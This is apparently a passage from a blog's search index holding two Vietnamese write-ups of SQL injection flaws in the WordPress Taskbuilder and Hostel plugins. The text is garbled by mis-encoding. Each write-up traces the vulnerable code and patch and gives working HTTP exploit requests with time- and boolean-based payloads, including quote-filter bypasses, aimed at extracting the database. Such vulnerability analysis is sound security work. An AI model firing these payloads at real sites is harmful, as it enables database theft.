ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability 